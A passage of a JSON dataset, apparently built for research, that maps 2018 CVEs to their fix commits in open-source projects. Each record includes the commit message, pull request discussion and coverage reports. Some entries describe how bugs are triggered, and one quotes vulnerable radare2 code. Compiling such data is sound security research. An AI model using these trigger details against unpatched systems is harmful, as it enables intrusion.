            "commit_msg": "Limit lenght to INT_MAX bytes in rfbProcessFileTransferReadBuffer()\n\nThis ammends 15bb719c03cc70f14c36a843dcb16ed69b405707 fix for a heap\nout-of-bound write access in rfbProcessFileTransferReadBuffer() when\nreading a transfered file content in a server. The former fix did not\nwork on platforms with a 32-bit int type (expected by rfbReadExact()).\n\nCVE-2018-15127\n<https://github.com/LibVNC/libvncserver/issues/243>\n<https://github.com/LibVNC/libvncserver/issues/273>",
            "commit_msg_words": 47,
            "other_info": "Limit lenght to INT_MAX bytes in rfbProcessFileTransferReadBuffer() I added the comment in 09e8fc02f59f16e2583b34fe1a270c238bd9ffec commit.\n For the record: we cannot safely maintain that SIZE_MAX > INT_MAX is always true as per https://stackoverflow.com/questions/46508831/is-the-max-value-of-size-t-size-max-defined-relative-to-the-other-integer-type. I was wondering if we could simplify the check...",
            "pr_title_words": 7,
            "comments_words": 33,
            "total_other_info_words": 40
        },
        {
            "cve-id": "CVE-2018-12435",
            "commit_url": "https://github.com/randombit/botan/commit/48fc8df51d99f9d8ba251219367b3d629cc848e3",
            "commit_msg": "Address DSA/ECDSA side channel",
            "commit_msg_words": 4,
            "other_info": "Address DSA/ECDSA side channel # [Codecov](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=h1) Report\n> Merging [#1604](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=desc) into [master](https://codecov.io/gh/randombit/botan/commit/55774de0ca0ed49c3be98786390b55f6eb486b77?src=pr&el=desc) will **decrease** coverage by `0.45%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/randombit/botan/pull/1604/graphs/tree.svg?token=VR6iYmSPH8&src=pr&height=150&width=650)](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #1604      +/-   ##\n==========================================\n- Coverage   91.04%   90.59%   -0.46%     \n==========================================\n  Files         501      501              \n  Lines       51099    51117      +18     \n  Branches     5531     5531              \n==========================================\n- Hits        46524    46310     -214     \n- Misses       4540     4773     +233     \n+ Partials       35       34       -1\n```\n\n\n| [Impacted Files](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/lib/pubkey/dsa/dsa.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvZHNhL2RzYS5jcHA=) | `98.66% <100%> (+0.11%)` | :arrow_up: |\n| [src/lib/pubkey/ecdsa/ecdsa.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvZWNkc2EvZWNkc2EuY3Bw) | `98.43% <100%> (+0.13%)` | :arrow_up: |\n| [src/lib/pubkey/ec\\_group/ec\\_group.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvZWNfZ3JvdXAvZWNfZ3JvdXAuY3Bw) | `89.65% <100%> (+0.28%)` | :arrow_up: |\n| [src/lib/hash/sha2\\_32/sha2\\_32\\_bmi2/sha2\\_32\\_bmi2.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9oYXNoL3NoYTJfMzIvc2hhMl8zMl9ibWkyL3NoYTJfMzJfYm1pMi5jcHA=) | `0% <0%> (-100%)` | :arrow_down: |\n| [...hreefish\\_512/threefish\\_512\\_avx2/threefish\\_avx2.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9ibG9jay90aHJlZWZpc2hfNTEyL3RocmVlZmlzaF81MTJfYXZ4Mi90aHJlZWZpc2hfYXZ4Mi5jcHA=) | `0% <0%> (-100%)` | :arrow_down: |\n| [src/lib/utils/cpuid/cpuid\\_x86.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi91dGlscy9jcHVpZC9jcHVpZF94ODYuY3Bw) | `75.92% <0%> (-7.41%)` | :arrow_down: |\n| [src/lib/pk\\_pad/emsa\\_raw/emsa\\_raw.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wa19wYWQvZW1zYV9yYXcvZW1zYV9yYXcuY3Bw) | `72.22% <0%> (-2.78%)` | :arrow_down: |\n| [src/lib/pubkey/mce/mceliece\\_key.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvbWNlL21jZWxpZWNlX2tleS5jcHA=) | `83% <0%> (-1.31%)` | :arrow_down: |\n| [src/lib/block/threefish\\_512/threefish\\_512.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9ibG9jay90aHJlZWZpc2hfNTEyL3RocmVlZmlzaF81MTIuY3Bw) | `91.75% <0%> (-1.04%)` | :arrow_down: |\n| [src/lib/pubkey/dl\\_group/dl\\_group.cpp](https://codecov.io/gh/randombit/botan/pull/1604/diff?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvZGxfZ3JvdXAvZGxfZ3JvdXAuY3Bw) | `89.37% <0%> (-0.97%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=footer). Last update [55774de...48fc8df](https://codecov.io/gh/randombit/botan/pull/1604?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n FTR: The CVE id for this issue is CVE-2018-12435 (the CVE-2018-0495 was specific assigned for libgcrypt) @carnil Yes there was a miscommunication among the various parties and my understanding at the time was CVE-2018-0495 was being used for all affected implementations. I have already updated the release notes to use -12435 instead.",
            "pr_title_words": 4,
            "comments_words": 259,
            "total_other_info_words": 263
        },
        {
            "cve-id": "CVE-2018-19107",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/b642b97fb9b08f188cfc7d461d60cd6bc971cbbf",
            "commit_msg": "PSD: Use Safe::add for preventing overflows in PSD files",
            "commit_msg_words": 9,
            "other_info": "Fix infinite loop in PsdImage::readMetadata  This change mades good use of Dan's _safe_ arithmetic.  I'm not sure what a _resourceLength_ is, however presumably if it's bigger that the file size, the file smells.  So, I approve of the _safe_ code and ask you to investigate resourceLength/file-size puzzle. # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=h1) Report\n> Merging [#518](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/933ce589a6e0a5a236eac7fbb07867fcaddb45e2?src=pr&el=desc) will **not change** coverage.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/518/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=tree)\n\n```diff\n@@           Coverage Diff           @@\n##           master     #518   +/-   ##\n=======================================\n  Coverage   63.59%   63.59%           \n=======================================\n  Files         154      154           \n  Lines       20560    20560           \n=======================================\n  Hits        13075    13075           \n  Misses       7485     7485\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/psdimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/518/diff?src=pr&el=tree#diff-c3JjL3BzZGltYWdlLmNwcA==) | `83.01% <100%> (\u00f8)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=footer). Last update [933ce58...e4b3bdd](https://codecov.io/gh/Exiv2/exiv2/pull/518?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Can we know the file size at this point? I thought that we were reading it chunk by chunk, and therefore we did not know its total size.  Great, I have added also that check that makes total sense and adapted the test code.  Note that these changes are also fixing the bug described in #427.",
            "pr_title_words": 5,
            "comments_words": 208,
            "total_other_info_words": 213
        },
        {
            "cve-id": "CVE-2018-7866",
            "commit_url": "https://github.com/libming/libming/commit/0aab70a3020dd8b4fad66b20995fc691f24a0317",
            "commit_msg": "decompile: fix null pointer dereference in newVar3\n\ngetString (indirectly called by getName) is passed a variable of non\nstandard type 10 (= \"PUSH_VARIABLE\"), which seems to return the\nstring contained in passed variable, without quotes. If contained\nstring is NULL, a NULL pointer is returned, which later causes NULL\npointer dereference.\n\nIn this patch we address this issue such that if the variable contains\nan invalid string, we act just like in the PUSH_STRING case. Otherwise\na copy of the string is returned.\n\nFixes: #118 (CVE-2018-7866).",
            "commit_msg_words": 86,
            "other_info": "decompile: fix various security issues (By the way, thanks for adding me to the group, but even if I have the permissions to merge now I still consider it essential to get an external review before getting any line of code into the master) Just noticed some NEWS entries are missing. Will be fixed soon. Do you want to include an entry for merged PR #138 since you're at it ? Thanks for the great work guys!\r\n\r\nwell.. i have some doubts, with the death of the flash, this library still be useful?\r\n\r\nin other words, AS3 is supported? @hlef how about fixing those NEWS entries so we merge this ?\r\n@Guardian820 Ming does not support AS3",
            "pr_title_words": 5,
            "comments_words": 112,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2018-18836",
            "commit_url": "https://github.com/netdata/netdata/commit/92327c9ec211bd1616315abcb255861b130b97ca",
            "commit_msg": "fixed vulnerabilities identified by red4sec.com (#4521)",
            "commit_msg_words": 6,
            "other_info": "fixed vulnerabilities identified by red4sec.com",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-6359",
            "commit_url": "https://github.com/libming/libming/commit/9c53bf8e165c3a74e20f4c93b4ab6c05fe67f187",
            "commit_msg": "Use OpCode instead of directly accessing actions\n\nInstead of directly accessing the actions array without checks\nfor the value of n (which may lead to heap buffer overflow etc,\nsee #83 or #105), use the dedicated OpCode function.",
            "commit_msg_words": 38,
            "other_info": "Use OpCode instead of directly accessing actions Confirmed, and merged. Thanks.",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2018-16149",
            "commit_url": "https://github.com/igrr/axtls-8266/commit/5efe2947ab45e81d84b5f707c51d1c64be52f36c",
            "commit_msg": "Apply CVE fixes for X509 parsing\n\nApply patches developed by Sze Yiu which correct a vulnerability in\nX509 parsing.  See CVE-2018-16150 and CVE-2018-16149 for more info.",
            "commit_msg_words": 26,
            "other_info": "Apply CVE fixes for X509 parsing Yay, more CVEs this week! Thanks!",
            "pr_title_words": 6,
            "comments_words": 6,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2018-19045",
            "commit_url": "https://github.com/acassen/keepalived/commit/c6247a9ef2c7b33244ab1d3aa5d629ec49f0a067",
            "commit_msg": "Add command line and configuration option to set umask\n\nIssue #1048 identified that files created by keepalived are created\nwith mode 0666. This commit changes the default to 0644, and also\nallows the umask to be specified in the configuration or as a command\nline option.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>",
            "commit_msg_words": 50,
            "other_info": "Allow limiting file access permissions for created files, and don't allow overwriting of systems files via symbolic links",
            "pr_title_words": 18,
            "comments_words": 0,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2018-16391",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad",
            "commit_msg": "fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.",
            "commit_msg_words": 17,
            "other_info": "Security issues identified by fuzzing",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-7247",
            "commit_url": "https://github.com/DanBloomberg/leptonica/commit/c1079bb8e77cdd426759e466729917ca37a3ed9f",
            "commit_msg": "prog/htmlviewer: Catch unbound memory access (CID 1386222)\n\nrootname can have any size, so limit the amount of copied bytes.\n\nSigned-off-by: Stefan Weil <sw@weilnetz.de>",
            "commit_msg_words": 23,
            "other_info": "Fix some issues reported by Coverity Scan Thanks, Stefan! This has been assigned: CVE-2018-7247",
            "pr_title_words": 7,
            "comments_words": 7,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2018-1000877",
            "commit_url": "https://github.com/libarchive/libarchive/commit/021efa522ad729ff0f5806c4ce53e4a6cc1daa31",
            "commit_msg": "Avoid a double-free when a window size of 0 is specified\n\nnew_size can be 0 with a malicious or corrupted RAR archive.\n\nrealloc(area, 0) is equivalent to free(area), so the region would\nbe free()d here and the free()d again in the cleanup function.\n\nFound with a setup running AFL, afl-rb, and qsym.",
            "commit_msg_words": 52,
            "other_info": "Fix various crash, memory corruption and infinite loop conditions There are some test cases at https://bugs.launchpad.net/ubuntu/+source/libarchive/+bug/1794909\r\n\r\n I have requested CVEs for these issues through the Distributed Weakness Filing project. In case someone else is looking for the CVEs, it looks like the assignments are :\r\n- CVE-2018-1000877 for https://github.com/libarchive/libarchive/commit/021efa522ad729ff0f5806c4ce53e4a6cc1daa31\r\n- CVE-2018-1000878 for https://github.com/libarchive/libarchive/commit/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28\r\n- CVE-2018-1000879 for https://github.com/libarchive/libarchive/commit/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175\r\n- CVE-2018-1000880 for https://github.com/libarchive/libarchive/commit/9c84b7426660c09c18cc349f6d70b5f8168b5680",
            "pr_title_words": 9,
            "comments_words": 52,
            "total_other_info_words": 61
        },
        {
            "cve-id": "CVE-2018-11697",
            "commit_url": "https://github.com/sass/libsass/commit/4573dbf9de0f43d745f4694bf92933166e6761a9",
            "commit_msg": "Fix memory leak in `parse_ie_keyword_arg`\n\n`kwd_arg` would never get freed when there was a parse error in\n`parse_ie_keyword_arg`.\n\nCloses #2656",
            "commit_msg_words": 20,
            "other_info": "Fix memory leak in `parse_ie_keyword_arg`",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-8786",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/445a5a42c500ceb80f8fa7f2c11f3682538033f3",
            "commit_msg": "Fixed CVE-2018-8786\n\nThanks to Eyal Itkin from Check Point Software Technologies.",
            "commit_msg_words": 11,
            "other_info": "Cve fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3393/",
            "pr_title_words": 2,
            "comments_words": 14,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2018-12265",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/937a1a2bd067b8b3b787f3757089d972f3a39853",
            "commit_msg": "Add offset_ and size_ safely in LoaderExifJpeg::LoaderExifJpeg\n\noffset_ can become arbitrarily large and overflows once its added to size_,\nthis causes all kinds of problems further in the code when offset_ is used\nagain.\n=> Use Safe::add() to catch potential overflows\nThis fixes #365.",
            "commit_msg_words": 44,
            "other_info": "Fix #365 and #366",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2018-18928",
            "commit_url": "https://github.com/unicode-org/icu/commit/53d8c8f3d181d87a6aa925b449b51c4a2c922a51",
            "commit_msg": "ICU-20246 Fixing another integer overflow in number parsing.",
            "commit_msg_words": 8,
            "other_info": "ICU-20246 Fixing another integer overflow in number parsing.",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2018-20000",
            "commit_url": "https://github.com/Bedework/bw-webdav/commit/0ce2007b3515a23b5f287ef521300bcb1f748edc",
            "commit_msg": "format: follow the repo code style, and welcome mvnvm props to manage maven versions",
            "commit_msg_words": 14,
            "other_info": "secure xml",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2018-1281",
            "commit_url": "https://github.com/dmlc/ps-lite/commit/4be817e8b03e7e92517e91f2dfcc50865e91c6ea",
            "commit_msg": "Avoid listening on all interfaces by default",
            "commit_msg_words": 7,
            "other_info": "Avoid listening on all interfaces by default @piiswrong - are you good with this? I remember ps-lite also supported infiniband. Is this disabling it?",
            "pr_title_words": 7,
            "comments_words": 17,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2018-14015",
            "commit_url": "https://github.com/radareorg/radare2/commit/d37d2b858ac47f2f108034be0bcecadaddfbc8b3",
            "commit_msg": "Fix #10465 - Avoid string on low addresses (workaround) for corrupted dwarf (#10478)",
            "commit_msg_words": 13,
            "other_info": "Fix #10465 - Avoid string on low addresses (workaround) for corrupted dwarfs According to the description of CVE-2018-14015, the affected radare2 version range is not correct. The versions from 2.0.0 to 2.7.0 are actually affected but not recorded.\r\nBased on the vulnerability code snippet, the earliest version was found in 2.0.0 (https://github.com/radareorg/radare2/blob/2.0.0/libr/bin/dwarf.c#L1349). This vulnerability code snippet exists in versions prior to 2.7.0 until it was fixed in the patch (https://github.com/radareorg/radare2/commit/d37d2b858ac47f2f108034be0bcecadaddfbc8b3) in version 2.7.0.\r\n```c\r\nif (cu->dies[cu->length].attr_values[i].name == DW_AT_comp_dir) {\r\n\tconst char *name = cu->dies[cu->length].attr_values[i].encoding.str_struct.string;\r\n\tsdb_set (s, \"DW_AT_comp_dir\", name, 0);\r\n}\r\n```\r\nplease confirm, thank you! sorry but i'm not going to spend time to verify an 8 year old bug.",
            "pr_title_words": 12,
            "comments_words": 98,
            "total_other_info_words": 110
        },
        {
            "cve-id": "CVE-2018-11376",
            "commit_url": "https://github.com/radareorg/radare2/commit/1f37c04f2a762500222dda2459e6a04646feeedf",
            "commit_msg": "Fix #9904 - crash in r2_hoobr_r_read_le32 (over 9000 entrypoints) and read_le oobread (#9923)",
            "commit_msg_words": 13,
            "other_info": "Fix #9904 - crash in r2_hoobr_r_read_le32 (many entrypoints) a oobread in r_read_le",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2018-9132",
            "commit_url": "https://github.com/libming/libming/commit/dc65ba0497f4c5ca58be2018e2816e72baf63634",
            "commit_msg": "decompile: Fix null pointer dereference in getInt\n\nWhen getInt is passed a PUSH_REGISTER parameter, it retrieves the\ncontent of this register and returns the value contained by this\nregister as an int. When this register is empty, we call getInt with\na NULL pointer and a null pointer dereference occurs.\n\nIn this patch we first make sure that regs[act->p.RegisterNumber] is\nnot NULL before doing anything with it.\n\nFixes #133 (CVE-2018-9132).",
            "commit_msg_words": 70,
            "other_info": "decompile: fix various security issues (By the way, thanks for adding me to the group, but even if I have the permissions to merge now I still consider it essential to get an external review before getting any line of code into the master) Just noticed some NEWS entries are missing. Will be fixed soon. Do you want to include an entry for merged PR #138 since you're at it ? Thanks for the great work guys!\r\n\r\nwell.. i have some doubts, with the death of the flash, this library still be useful?\r\n\r\nin other words, AS3 is supported? @hlef how about fixing those NEWS entries so we merge this ?\r\n@Guardian820 Ming does not support AS3",
            "pr_title_words": 5,
            "comments_words": 112,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2018-1000880",
            "commit_url": "https://github.com/libarchive/libarchive/commit/9c84b7426660c09c18cc349f6d70b5f8168b5680",
            "commit_msg": "warc: consume data once read\n\nThe warc decoder only used read ahead, it wouldn't actually consume\ndata that had previously been printed. This means that if you specify\nan invalid content length, it will just reprint the same data over\nand over and over again until it hits the desired length.\n\nThis means that a WARC resource with e.g.\nContent-Length: 666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666665\nbut only a few hundred bytes of data, causes a quasi-infinite loop.\n\nConsume data in subsequent calls to _warc_read.\n\nFound with an AFL + afl-rb + qsym setup.",
            "commit_msg_words": 89,
            "other_info": "Fix various crash, memory corruption and infinite loop conditions There are some test cases at https://bugs.launchpad.net/ubuntu/+source/libarchive/+bug/1794909\r\n\r\n I have requested CVEs for these issues through the Distributed Weakness Filing project. In case someone else is looking for the CVEs, it looks like the assignments are :\r\n- CVE-2018-1000877 for https://github.com/libarchive/libarchive/commit/021efa522ad729ff0f5806c4ce53e4a6cc1daa31\r\n- CVE-2018-1000878 for https://github.com/libarchive/libarchive/commit/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28\r\n- CVE-2018-1000879 for https://github.com/libarchive/libarchive/commit/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175\r\n- CVE-2018-1000880 for https://github.com/libarchive/libarchive/commit/9c84b7426660c09c18cc349f6d70b5f8168b5680",
            "pr_title_words": 9,
            "comments_words": 52,
            "total_other_info_words": 61
        },
        {
            "cve-id": "CVE-2018-11531",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/0330f6bf32e20c18cadf578daada42a343540340",
            "commit_msg": "Use index to access buf.pData_",
            "commit_msg_words": 5,
            "other_info": "Fix issue #283 @D4N thanks for your feedback. I implemented the changes you requested.",
            "pr_title_words": 3,
            "comments_words": 11,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2018-20406",
            "commit_url": "https://github.com/python/cpython/commit/a4ae828ee416a66d8c7bf5ee71d653c2cc6a26dd",
            "commit_msg": "closes bpo-34656: Avoid relying on signed overflow in _pickle memos. (GH-9261)",
            "commit_msg_words": 11,
            "other_info": "bpo-34656: Avoid relying on signed overflow in _pickle memos. Thanks @benjaminp for the PR \ud83c\udf2e\ud83c\udf89.. I'm working now to backport this PR to: 3.6, 3.7.\n\ud83d\udc0d\ud83c\udf52\u26cf\ud83e\udd16  [GH-9465](https://github.com/python/cpython/pull/9465) is a backport of this pull request to the [3.7 branch](https://github.com/python/cpython/tree/3.7). [GH-9466](https://github.com/python/cpython/pull/9466) is a backport of this pull request to the [3.6 branch](https://github.com/python/cpython/tree/3.6).",
            "pr_title_words": 9,
            "comments_words": 41,
            "total_other_info_words": 50
        },
        {
            "cve-id": "CVE-2018-19666",
            "commit_url": "https://github.com/ossec/ossec-hids/commit/c72bb25d9114250d570dddb27ae0cfc0de30c45e",
            "commit_msg": "Backport directory-traversal fix from Wazuh.",
            "commit_msg_words": 5,
            "other_info": "Backport directory-traversal fix from Wazuh.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-16426",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/03628449b75a93787eb2359412a3980365dda49b",
            "commit_msg": "iasecc: fixed unbound recursion",
            "commit_msg_words": 4,
            "other_info": "Security issues identified by fuzzing",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-18443",
            "commit_url": "https://github.com/AcademySoftwareFoundation/openexr/commit/adbc1900cb9d25fcc4df008d4008b781cf2fa4f8",
            "commit_msg": "Fix #350 - memory leak on exit\n\nThis fixes CVE-2018-18443, the last thread pool provider set into the\npool was not being correctly cleaned up at shutdown of the thread pool.\n\nSigned-off-by: Kimball Thurston <kdt3rd@gmail.com>",
            "commit_msg_words": 35,
            "other_info": "Fix #350 - memory leak on exit Looks good to me.",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2018-16521",
            "commit_url": "https://github.com/openmrs/openmrs-module-htmlformentry/commit/9dcd304688e65c31cac5532fe501b9816ed975ae",
            "commit_msg": "Configure xml parser to ignore xxe entities\n\nDisallow malicious xxe, allow benign xxe",
            "commit_msg_words": 13,
            "other_info": "Configure xml parser to ignore xxe entities",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-25021",
            "commit_url": "https://github.com/TokTok/c-toxcore/commit/5beb00c93d3adb5c23149535624d27c67bc146ea",
            "commit_msg": "Fix memleak in tcp server by wiping priority queues on deletion",
            "commit_msg_words": 11,
            "other_info": "Fix memory leak in tcp server by wiping priority queues on deletion. It turns out that this closes #1214, as this was the memleak exploited there.\r\n@kpp found the flaw first, and chose to communicate it to us non-verbally in this way.\r\n@kpp and I just tested that this patch does nullify that attack. https://github.com/tox-rs/tox is your best friend =) The second 0day this year. This doesn't actually fix all the potential memleaks yet. e.g. in kill_TCP_server the TCP_Secure_Connections aren't wiped, so there could be unfreed priority queues. Similarly in realloc_connection. I'm also worried about the potential for double frees. This is going to take some care... is there anyone who's actually familiar with TCP_server.c and wouldn't mind helping out? @zugz what do you mean by \"non-verbally\"? How exactly did he communicate? Was it by taking down 3/4 of bootstrap nodes? Because if so, then that's a rather malicious way of communicating and tox-rs ain't no friend. * Saturday, 2018-09-29 at 12:36 -0700 - nurupo <notifications@github.com>:\n\n>@zugz what do you mean by \"non-verbally\"? How exactly did he \n>communicate? Was it by taking down 3/4 of bootstrap nodes?\n\nThat is what I meant.\n # [Codecov](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=h1) Report\n> Merging [#1216](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=desc) into [master](https://codecov.io/gh/TokTok/c-toxcore/commit/b2b96b1aa19ef2eb2816303e606a3f23550538dc?src=pr&el=desc) will **decrease** coverage by `0.1%`.\n> The diff coverage is `85%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/graphs/tree.svg?width=650&token=BRfCKo02De&height=150&src=pr)](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=tree)\n\n```diff\n@@           Coverage Diff            @@\n##           master   #1216     +/-   ##\n========================================\n- Coverage    82.8%   82.7%   -0.2%     \n========================================\n  Files          82      82             \n  Lines       14634   14647     +13     \n========================================\n- Hits        12125   12120      -5     \n- Misses       2509    2527     +18\n```\n\n\n| [Impacted Files](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [toxcore/TCP\\_client.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94Y29yZS9UQ1BfY2xpZW50LmM=) | `64.6% <100%> (+0.3%)` | :arrow_up: |\n| [toxcore/TCP\\_server.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94Y29yZS9UQ1Bfc2VydmVyLmM=) | `75.9% <84.6%> (+0.9%)` | :arrow_up: |\n| [auto\\_tests/toxav\\_many\\_test.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-YXV0b190ZXN0cy90b3hhdl9tYW55X3Rlc3QuYw==) | `92.5% <0%> (-4.1%)` | :arrow_down: |\n| [toxcore/net\\_crypto.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94Y29yZS9uZXRfY3J5cHRvLmM=) | `93.5% <0%> (-1.4%)` | :arrow_down: |\n| [toxav/msi.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94YXYvbXNpLmM=) | `63.6% <0%> (-1.2%)` | :arrow_down: |\n| [toxav/toxav.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94YXYvdG94YXYuYw==) | `67.1% <0%> (-1%)` | :arrow_down: |\n| [toxcore/Messenger.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94Y29yZS9NZXNzZW5nZXIuYw==) | `86.6% <0%> (+0.1%)` | :arrow_up: |\n| [toxcore/friend\\_connection.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-dG94Y29yZS9mcmllbmRfY29ubmVjdGlvbi5j) | `94.5% <0%> (+0.8%)` | :arrow_up: |\n| [auto\\_tests/toxav\\_basic\\_test.c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216/diff?src=pr&el=tree#diff-YXV0b190ZXN0cy90b3hhdl9iYXNpY190ZXN0LmM=) | `83.5% <0%> (+1.9%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=footer). Last update [b2b96b1...5beb00c](https://codecov.io/gh/TokTok/c-toxcore/pull/1216?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n OK, this is ready for (re)review now, and I believe it now fully seals this source of memleaks rather than just dealing with the case exploited in #1214. There wasn't nearly as much further work as I was fearing in my previous comment.\r\n\r\nA word on my methodology here: I haven't actually grokked the entirety of TCP_server.c; rather, I searched for \"TCP_Secure_Connection\" and followed up on each hit. I don't see that I could be missing anything. Also, with these latest changes asan now passes on #1215 - and asan's previous failure there was what directly led me to finding the memleak, which incidentally I think we can read as a win for our testing regime!\r\n\r\nAnyway, please review carefully. This is how I fixed it: https://github.com/irungentoo/toxcore/commit/bf69b54f64003d160d759068f4816b2d9b2e1e21",
            "pr_title_words": 12,
            "comments_words": 497,
            "total_other_info_words": 509
        },
        {
